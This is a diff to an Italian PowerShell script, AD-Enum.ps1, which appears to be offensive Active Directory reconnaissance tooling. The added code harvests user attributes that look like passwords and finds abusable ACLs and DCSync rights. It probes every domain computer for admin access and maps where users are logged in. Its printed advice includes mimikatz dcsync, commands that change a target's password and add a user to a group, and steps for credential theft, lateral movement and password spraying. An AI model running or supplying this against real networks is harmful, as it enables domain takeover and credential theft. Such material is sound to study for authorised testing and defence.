@@ -1,4 +1,4 @@
-# AD-Enum.ps1 - Script di Enumerazione Active Directory Completo
+# AD-Enum.ps1 - Script di Enumerazione Active Directory
 # Uso: .\AD-Enum.ps1 oppure Import-Module .\AD-Enum.ps1; Invoke-ADEnum
 
 #region Funzioni Helper
@@ -56,14 +56,17 @@ function LDAPSearch {
     $DistinguishedName = ([adsi]'').distinguishedName
     $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
     $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    
     $DirectorySearcher.PageSize = 1000
+    $DirectorySearcher.SizeLimit = 0
+    $DirectorySearcher.CacheResults = $false
     
     return $DirectorySearcher.FindAll()
 }
 
 #endregion
 
-#region Funzioni di Enumerazione
+#region Funzioni di Enumerazione Base
 
 function Get-DomainInfo {
     Write-Banner "INFORMAZIONI DOMINIO"
@@ -110,7 +113,6 @@ function Get-DomainUsers {
     $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
     $userCount = 0
     $adminUsers = @()
-    $serviceAccounts = @()
     $disabledUsers = @()
     $neverExpirePassword = @()
     $noPreauth = @()
@@ -143,20 +145,43 @@ function Get-DomainUsers {
                 }
             }
         }
-        
-        # Controlla service account
-        if ($username -match "svc|service|sql|iis|backup|admin") {
-            $serviceAccounts += $username
-        }
     }
     
     Write-Finding "Totale Utenti" $userCount
+
+    Write-Section "Lista Completa Utenti (Proprietà Non-Default)"
+    $defaultProps = @('adspath','distinguishedname','dscorepropagationdata','instancetype','name','cn','objectcategory','objectclass','objectguid','objectsid','primarygroupid','samaccountname','samaccounttype','useraccountcontrol','usncreated','usnchanged','whenchanged','whencreated','codepage','countrycode','lastlogoff','lastlogon','logoncount','badpwdcount','badpasswordtime','pwdlastset','accountexpires','lastlogontimestamp')
+
+    foreach ($user in $users) {
+        $props = $user.Properties
+        $username = $props.samaccountname[0]
+        $interesting = @{}
+        
+        foreach ($propName in $props.PropertyNames) {
+            if ($propName -notin $defaultProps) {
+                $val = $props[$propName][0]
+                if ($val -and $val.ToString().Trim()) { $interesting[$propName] = $val }
+            }
+        }
+        
+        if ($interesting.Count -gt 0) {
+            Write-SubSection $username
+            foreach ($k in $interesting.Keys) {
+                if ($k -match 'pass|pwd|cred|secret|key|comment|info|script|home|profile' -or $interesting[$k] -match 'pass|pwd|cred|secret|\\\\') {
+                    Write-Finding $k $interesting[$k] -Important
+                } else {
+                    Write-Finding $k $interesting[$k]
+                }
+            }
+        } else {
+            Write-Host "    [*] $username" -ForegroundColor DarkGray
+        }
+    }
     
     Write-Section "Utenti Privilegiati (IMPORTANTE!)"
     if ($adminUsers.Count -gt 0) {
         foreach ($admin in ($adminUsers | Sort-Object -Unique)) {
             Write-SubSection $admin
-            # Ottieni dettagli admin
             $adminDetails = LDAPSearch -LDAPQuery "(samaccountname=$admin)"
             $groups = $adminDetails.Properties.memberof
             foreach ($g in $groups) {
@@ -170,15 +195,6 @@ function Get-DomainUsers {
         }
     } else {
         Write-Info "Nessun utente admin trovato (strano!)"
-    }
-    
-    Write-Section "Potenziali Service Account"
-    if ($serviceAccounts.Count -gt 0) {
-        foreach ($svc in ($serviceAccounts | Sort-Object -Unique)) {
-            Write-SubSection $svc
-        }
-    } else {
-        Write-Info "Nessun service account identificato"
     }
     
     Write-Section "Account con Kerberos Pre-Auth Disabilitata (AS-REP Roastable!)"
@@ -338,7 +354,6 @@ function Get-SPNs {
     foreach ($user in $spnUsers) {
         $username = $user.Properties.samaccountname[0]
         
-        # Escludi krbtgt
         if ($username -eq "krbtgt") { continue }
         
         $found = $true
@@ -376,7 +391,6 @@ function Get-PasswordPolicy {
         Write-Finding "Lockout Observation Window" $policy.LockoutObservationWindow
     }
     catch {
-        # Fallback usando net accounts
         Write-Section "Policy Password (via net accounts)"
         $netAccounts = net accounts /domain 2>&1
         foreach ($line in $netAccounts) {
@@ -439,15 +453,517 @@ function Get-DomainShares {
 function Get-ACLAbuse {
     Write-Banner "POTENZIALI ACL ABUSE"
     
-    Write-Section "Ricerca permessi pericolosi..."
-    Write-Info "Per un'analisi completa degli ACL, usa BloodHound o PowerView"
-    Write-Info "Comandi utili:"
+    Write-Section "Ricerca permessi pericolosi su oggetti AD"
+    Write-Info "Permessi cercati: GenericAll, GenericWrite, WriteOwner, WriteDACL, Self"
     Write-Host ""
-    Write-Host "    # PowerView - Trova permessi GenericAll" -ForegroundColor Yellow
-    Write-Host '    Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}' -ForegroundColor Gray
+    
+    # Permessi pericolosi da cercare
+    $dangerousRights = @(
+        'GenericAll',
+        'GenericWrite', 
+        'WriteOwner',
+        'WriteDacl',
+        'Self',
+        'ForceChangePassword',
+        'AllExtendedRight'
+    )
+    
+    # SID da ignorare (built-in/system accounts)
+    $ignoredSIDs = @(
+        'S-1-5-18',           # Local System
+        'S-1-5-32-544',       # BUILTIN\Administrators
+        'S-1-5-32-548',       # BUILTIN\Account Operators
+        'S-1-5-9',            # Enterprise Domain Controllers
+        'S-1-3-0',            # Creator Owner
+        'S-1-5-10'            # Self
+    )
+    
+    $findings = @()
+    
+    # Ottieni Domain SID per filtrare gruppi privilegiati
+    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+    $PDC = $domainObj.PdcRoleOwner.Name
+    $DN = ([adsi]'').distinguishedName
+    $domainSID = (New-Object System.Security.Principal.NTAccount($domainObj.Name, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+    $domainSID = $domainSID -replace '-512$', ''  # Rimuovi RID per ottenere Domain SID
+    
+    # SID di gruppi privilegiati da ignorare
+    $privilegedGroupSIDs = @(
+        "$domainSID-512",     # Domain Admins
+        "$domainSID-519",     # Enterprise Admins
+        "$domainSID-518",     # Schema Admins
+        "$domainSID-500"      # Administrator
+    )
+    
+    $allIgnored = $ignoredSIDs + $privilegedGroupSIDs
+    
+    # Funzione helper per convertire SID in nome
+    function Convert-SIDToName {
+        param([string]$SID)
+        try {
+            $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
+            $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
+            return $objUser.Value
+        }
+        catch {
+            return $SID
+        }
+    }
+    
+    # Enumera utenti
+    Write-SubSection "Analisi ACL su Utenti..."
+    $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+    
+    foreach ($user in $users) {
+        $userDN = $user.Properties.distinguishedname[0]
+        $userName = $user.Properties.samaccountname[0]
+        
+        try {
+            $userEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$userDN")
+            $acl = $userEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
+            
+            foreach ($ace in $acl) {
+                $rights = $ace.ActiveDirectoryRights.ToString()
+                $sid = $ace.IdentityReference.Value
+                
+                # Salta SID di sistema e gruppi privilegiati
+                if ($sid -in $allIgnored) { continue }
+                if ($sid -match '^S-1-5-21-.*-(512|519|518|500)$') { continue }
+                
+                # Controlla se ha permessi pericolosi
+                foreach ($dangerous in $dangerousRights) {
+                    if ($rights -match $dangerous) {
+                        $principalName = Convert-SIDToName -SID $sid
+                        
+                        # Ignora se il principal è un gruppo privilegiato
+                        if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator') { continue }
+                        
+                        $findings += [PSCustomObject]@{
+                            TargetObject = $userName
+                            TargetType = "User"
+                            Principal = $principalName
+                            Rights = $rights
+                            Dangerous = $dangerous
+                        }
+                        break
+                    }
+                }
+            }
+        }
+        catch {}
+    }
+    
+    # Enumera gruppi
+    Write-SubSection "Analisi ACL su Gruppi..."
+    $groups = LDAPSearch -LDAPQuery "(objectCategory=group)"
+    
+    foreach ($group in $groups) {
+        $groupDN = $group.Properties.distinguishedname[0]
+        $groupName = $group.Properties.cn[0]
+        
+        try {
+            $groupEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$groupDN")
+            $acl = $groupEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
+            
+            foreach ($ace in $acl) {
+                $rights = $ace.ActiveDirectoryRights.ToString()
+                $sid = $ace.IdentityReference.Value
+                
+                if ($sid -in $allIgnored) { continue }
+                if ($sid -match '^S-1-5-21-.*-(512|519|518|500)$') { continue }
+                
+                foreach ($dangerous in $dangerousRights) {
+                    if ($rights -match $dangerous) {
+                        $principalName = Convert-SIDToName -SID $sid
+                        
+                        if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator') { continue }
+                        
+                        $findings += [PSCustomObject]@{
+                            TargetObject = $groupName
+                            TargetType = "Group"
+                            Principal = $principalName
+                            Rights = $rights
+                            Dangerous = $dangerous
+                        }
+                        break
+                    }
+                }
+            }
+        }
+        catch {}
+    }
+    
+    # Enumera computer
+    Write-SubSection "Analisi ACL su Computer..."
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    
+    foreach ($computer in $computers) {
+        $compDN = $computer.Properties.distinguishedname[0]
+        $compName = $computer.Properties.name[0]
+        
+        try {
+            $compEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$compDN")
+            $acl = $compEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
+            
+            foreach ($ace in $acl) {
+                $rights = $ace.ActiveDirectoryRights.ToString()
+                $sid = $ace.IdentityReference.Value
+                
+                if ($sid -in $allIgnored) { continue }
+                if ($sid -match '^S-1-5-21-.*-(512|519|518|500)$') { continue }
+                
+                foreach ($dangerous in $dangerousRights) {
+                    if ($rights -match $dangerous) {
+                        $principalName = Convert-SIDToName -SID $sid
+                        
+                        if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator') { continue }
+                        
+                        $findings += [PSCustomObject]@{
+                            TargetObject = $compName
+                            TargetType = "Computer"
+                            Principal = $principalName
+                            Rights = $rights
+                            Dangerous = $dangerous
+                        }
+                        break
+                    }
+                }
+            }
+        }
+        catch {}
+    }
+    
+    # Controlla DCSync rights sul dominio
+    Write-SubSection "Analisi DCSync Rights..."
+    try {
+        $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
+        $acl = $domainEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
+        
+        # GUIDs per DCSync
+        $replicationGUIDs = @(
+            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes
+            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes-All
+            '89e95b76-444d-4c62-991a-0facbeda640c'   # DS-Replication-Get-Changes-In-Filtered-Set
+        )
+        
+        foreach ($ace in $acl) {
+            $sid = $ace.IdentityReference.Value
+            
+            if ($sid -in $allIgnored) { continue }
+            if ($sid -match '^S-1-5-21-.*-(512|519|518|500)$') { continue }
+            
+            $objectType = $ace.ObjectType.ToString()
+            
+            if ($objectType -in $replicationGUIDs) {
+                $principalName = Convert-SIDToName -SID $sid
+                
+                if ($principalName -match 'Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Administrator|Domain Controllers') { continue }
+                
+                $findings += [PSCustomObject]@{
+                    TargetObject = "DOMAIN"
+                    TargetType = "DCSync"
+                    Principal = $principalName
+                    Rights = "Replication Rights"
+                    Dangerous = "DCSync"
+                }
+            }
+        }
+    }
+    catch {}
+    
+    # Mostra risultati
+    if ($findings.Count -gt 0) {
+        Write-Section "PERMESSI PERICOLOSI TROVATI!"
+        
+        # Raggruppa per principal
+        $groupedFindings = $findings | Group-Object -Property Principal
+        
+        foreach ($group in $groupedFindings) {
+            Write-Warning "$($group.Name) ha permessi pericolosi:"
+            
+            foreach ($finding in $group.Group) {
+                $color = if ($finding.Dangerous -eq 'GenericAll' -or $finding.Dangerous -eq 'DCSync') { 'Red' } else { 'Yellow' }
+                Write-Host "        [$($finding.TargetType)] " -ForegroundColor Cyan -NoNewline
+                Write-Host "$($finding.TargetObject)" -ForegroundColor White -NoNewline
+                Write-Host " -> " -NoNewline
+                Write-Host "$($finding.Dangerous)" -ForegroundColor $color
+            }
+            Write-Host ""
+        }
+        
+        Write-Section "POSSIBILI ATTACCHI"
+        
+        $genericAllFindings = $findings | Where-Object { $_.Dangerous -eq 'GenericAll' }
+        $dcSyncFindings = $findings | Where-Object { $_.Dangerous -eq 'DCSync' }
+        $writeFindings = $findings | Where-Object { $_.Dangerous -match 'Write|Self' }
+        
+        if ($genericAllFindings) {
+            Write-Info "GenericAll trovato - Puoi:"
+            Write-Host "        - Cambiare password dell'oggetto target" -ForegroundColor White
+            Write-Host "        - Aggiungere utenti a gruppi" -ForegroundColor White
+            Write-Host "        - Modificare qualsiasi attributo" -ForegroundColor White
+            Write-Host ""
+        }
+        
+        if ($dcSyncFindings) {
+            Write-Warning "DCSync Rights trovato - Puoi estrarre TUTTI gli hash!"
+            Write-Host "        mimikatz # lsadump::dcsync /user:Administrator" -ForegroundColor Yellow
+            Write-Host ""
+        }
+        
+        if ($writeFindings) {
+            Write-Info "Write permissions trovate - Puoi:"
+            Write-Host "        - WriteDacl: Modificare i permessi" -ForegroundColor White
+            Write-Host "        - WriteOwner: Diventare proprietario" -ForegroundColor White
+            Write-Host "        - Self: Aggiungerti a gruppi" -ForegroundColor White
+            Write-Host ""
+        }
+        
+    } else {
+        Write-Info "Nessun permesso pericoloso trovato su utenti non privilegiati"
+    }
+    
+    Write-Section "Comandi utili (se hai PowerView)"
+    Write-Host "    # Trova permessi GenericAll" -ForegroundColor Yellow
+    Write-Host '    Get-ObjectAcl -Identity "gruppo" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights' -ForegroundColor Gray
     Write-Host ""
-    Write-Host "    # PowerView - Trova DCSync rights" -ForegroundColor Yellow
-    Write-Host '    Get-ObjectAcl -DistinguishedName "DC=corp,DC=com" -ResolveGUIDs | Where-Object {($_.ObjectType -match "replication")}' -ForegroundColor Gray
+    Write-Host "    # Sfrutta GenericAll su gruppo" -ForegroundColor Yellow
+    Write-Host '    net group "NomeGruppo" tuouser /add /domain' -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "    # Sfrutta GenericAll su utente (cambia password)" -ForegroundColor Yellow
+    Write-Host '    net user targetuser NuovaPassword123! /domain' -ForegroundColor Gray
+}
+
+#endregion
+
+#region Funzioni Enumerazione Sessioni e Accessi
+
+function Get-LocalAdminAccess {
+    Write-Banner "RICERCA ACCESSO ADMIN LOCALE"
+    
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    $currentHost = $env:COMPUTERNAME
+    $currentHost = $currentHost.ToLower()
+    
+    Write-Section "Test accesso Admin su tutti i computer"
+    Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
+    Write-Info "Host corrente: $currentHost (escluso dal test)"
+    Write-Host ""
+    
+    $adminAccess = @()
+    
+    foreach ($computer in $computers) {
+        $hostname = $computer.Properties.dnshostname[0]
+        $name = $computer.Properties.name[0]
+        if (-not $hostname) { continue }
+    
+        # Salta l'host corrente (case-insensitive)
+        if ($name.ToLower() -eq $currentHost -or $hostname.StartsWith("$currentHost.")) {
+            Write-Host "    [*] $name - Host corrente (skipped)" -ForegroundColor DarkGray
+            continue
+        }
+        
+        # Test accesso C$ (più affidabile di ADMIN$)
+        $cShare = "\\$hostname\C$"
+        
+        try {
+            $testPath = Join-Path $cShare "Windows"
+            $exists = Test-Path $testPath -ErrorAction Stop
+            if ($exists) {
+                $adminAccess += $hostname
+                Write-Warning "$name ($hostname) - ADMIN ACCESS CONFERMATO!"
+            }
+            else {
+                Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
+            }
+        }
+        catch [System.UnauthorizedAccessException] {
+            Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
+        }
+        catch {
+            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
+        }
+    }
+    
+    if ($adminAccess.Count -gt 0) {
+        Write-Section "RIEPILOGO - Computer con Admin Access"
+        foreach ($h in $adminAccess) {
+            Write-Warning $h
+        }
+        Write-Host ""
+        Write-Info "Puoi connetterti a questi computer ed estrarre credenziali!"
+    } else {
+        Write-Info "Nessun accesso admin locale trovato con l'utente corrente"
+    }
+    
+    return $adminAccess
+}
+
+function Get-LoggedOnUsersRemoteRegistry {
+    param(
+        [string]$ComputerName
+    )
+    
+    $loggedOnUsers = @()
+    
+    try {
+        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
+        $subkeys = $reg.GetSubKeyNames()
+        
+        foreach ($sid in $subkeys) {
+            # Filtra solo SID di utenti di dominio (S-1-5-21-...)
+            if ($sid -match '^S-1-5-21-' -and $sid -notmatch '_Classes$') {
+                try {
+                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
+                    $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
+                    $loggedOnUsers += $objUser.Value
+                }
+                catch {
+                    # Se non riesce a tradurre, salva il SID raw
+                    $loggedOnUsers += "SID: $sid"
+                }
+            }
+        }
+        $reg.Close()
+    }
+    catch {
+        return $null
+    }
+    
+    return $loggedOnUsers
+}
+
+function Get-DomainLoggedOnUsers {
+    Write-Banner "UTENTI LOGGATI NEL DOMINIO"
+    
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    
+    Write-Section "Enumerazione sessioni via Remote Registry"
+    Write-Info "Nota: Richiede Remote Registry attivo sul target (default su Server)"
+    Write-Host ""
+    
+    $sessionsFound = @{}
+    
+    foreach ($computer in $computers) {
+        $hostname = $computer.Properties.dnshostname[0]
+        $name = $computer.Properties.name[0]
+        if (-not $hostname) { continue }
+        
+        $users = Get-LoggedOnUsersRemoteRegistry -ComputerName $hostname
+        
+        if ($null -eq $users) {
+            Write-Host "    [*] $name - Remote Registry non disponibile" -ForegroundColor DarkGray
+        }
+        elseif ($users.Count -eq 0) {
+            Write-Host "    [*] $name - Nessun utente loggato" -ForegroundColor DarkGray
+        }
+        else {
+            Write-SubSection $name
+            foreach ($user in $users) {
+                Write-Finding "Utente loggato" $user -Important
+                
+                if (-not $sessionsFound.ContainsKey($user)) {
+                    $sessionsFound[$user] = @()
+                }
+                $sessionsFound[$user] += $name
+            }
+        }
+    }
+    
+    if ($sessionsFound.Count -gt 0) {
+        Write-Section "RIEPILOGO SESSIONI PER UTENTE"
+        foreach ($user in $sessionsFound.Keys) {
+            Write-SubSection $user
+            foreach ($comp in $sessionsFound[$user]) {
+                Write-Finding "Loggato su" $comp
+            }
+        }
+        
+        Write-Host ""
+        Write-Info "Se hai admin access su questi computer, puoi rubare le credenziali!"
+    }
+}
+
+function Get-DomainSessionsWMI {
+    Write-Banner "SESSIONI VIA WMI"
+    
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    
+    Write-Section "Enumerazione sessioni via WMI (Win32_ComputerSystem)"
+    Write-Info "Nota: Richiede privilegi admin sul target"
+    Write-Host ""
+    
+    $sessionsFound = @{}
+    
+    foreach ($computer in $computers) {
+        $hostname = $computer.Properties.dnshostname[0]
+        $name = $computer.Properties.name[0]
+        if (-not $hostname) { continue }
+        
+        try {
+            $cs = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $hostname -ErrorAction Stop
+            $loggedUser = $cs.UserName
+            
+            if ($loggedUser) {
+                Write-SubSection $name
+                Write-Finding "Utente loggato" $loggedUser -Important
+                
+                if (-not $sessionsFound.ContainsKey($loggedUser)) {
+                    $sessionsFound[$loggedUser] = @()
+                }
+                $sessionsFound[$loggedUser] += $name
+            }
+            else {
+                Write-Host "    [*] $name - Nessuna sessione interattiva" -ForegroundColor DarkGray
+            }
+        }
+        catch [System.UnauthorizedAccessException] {
+            Write-Host "    [*] $name - Accesso WMI negato" -ForegroundColor DarkGray
+        }
+        catch {
+            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
+        }
+    }
+    
+    if ($sessionsFound.Count -gt 0) {
+        Write-Section "RIEPILOGO SESSIONI WMI"
+        foreach ($user in $sessionsFound.Keys) {
+            Write-SubSection $user
+            foreach ($comp in $sessionsFound[$user]) {
+                Write-Finding "Loggato su" $comp
+            }
+        }
+    }
+}
+
+function Get-InterestingTargets {
+    Write-Banner "TARGET INTERESSANTI"
+    
+    Write-Section "Analisi Attack Path"
+    
+    # Trova admin
+    $admins = @()
+    $adminQuery = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Domain Admins))"
+    if ($adminQuery) {
+        $members = $adminQuery.Properties.member
+        foreach ($m in $members) {
+            if ($m -match "CN=([^,]+)") {
+                $admins += $matches[1]
+            }
+        }
+    }
+    
+    Write-SubSection "Domain Admins identificati"
+    foreach ($admin in $admins) {
+        Write-Finding "Admin" $admin -Important
+    }
+    
+    Write-Host ""
+    Write-Info "Prossimi passi suggeriti:"
+    Write-Host "    1. Trova dove sono loggati i Domain Admins" -ForegroundColor White
+    Write-Host "    2. Verifica se hai admin access su quei computer" -ForegroundColor White
+    Write-Host "    3. Estrai credenziali con Mimikatz" -ForegroundColor White
+    Write-Host "    4. Esegui lateral movement" -ForegroundColor White
 }
 
 #endregion
@@ -457,7 +973,8 @@ function Get-ACLAbuse {
 function Invoke-ADEnum {
     param(
         [switch]$Quick,
-        [switch]$Full
+        [switch]$Full,
+        [switch]$Sessions
     )
     
     $startTime = Get-Date
@@ -466,7 +983,7 @@ function Invoke-ADEnum {
     Write-Host "[*] Utente corrente: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Green
     Write-Host ""
     
-    # Esegui enumerazione
+    # Enumerazione base
     Get-DomainInfo
     Get-PasswordPolicy
     Get-DomainUsers
@@ -474,25 +991,30 @@ function Invoke-ADEnum {
     Get-SPNs
     Get-DomainComputers
     
-    if ($Full) {
+    if ($Full -or $Sessions) {
         Get-GPOs
         Get-DomainShares
         Get-ACLAbuse
+        Get-LocalAdminAccess
+        Get-DomainLoggedOnUsers
+        Get-DomainSessionsWMI
+        Get-InterestingTargets
     }
     
     # Riepilogo finale
     $endTime = Get-Date
     $duration = $endTime - $startTime
     
-    Write-Host "RIEPILOGO ENUMERAZIONE"
+    Write-Banner "RIEPILOGO ENUMERAZIONE"
     Write-Host "[*] Completato in: $($duration.TotalSeconds.ToString('0.00')) secondi" -ForegroundColor Green
     Write-Host ""
     Write-Host "[!] PROSSIMI PASSI CONSIGLIATI:" -ForegroundColor Yellow
     Write-Host "    1. Controlla utenti AS-REP Roastable" -ForegroundColor White
     Write-Host "    2. Controlla service account Kerberoastable" -ForegroundColor White
-    Write-Host "    3. Enumera permessi con BloodHound/PowerView" -ForegroundColor White
-    Write-Host "    4. Cerca credenziali in SYSVOL/GPP" -ForegroundColor White
-    Write-Host "    5. Testa password spray con utenti trovati" -ForegroundColor White
+    Write-Host "    3. Verifica computer con admin access" -ForegroundColor White
+    Write-Host "    4. Trova dove sono loggati i Domain Admins" -ForegroundColor White
+    Write-Host "    5. Cerca credenziali in SYSVOL/GPP" -ForegroundColor White
+    Write-Host "    6. Testa password spray con utenti trovati" -ForegroundColor White
     Write-Host ""
 }
 
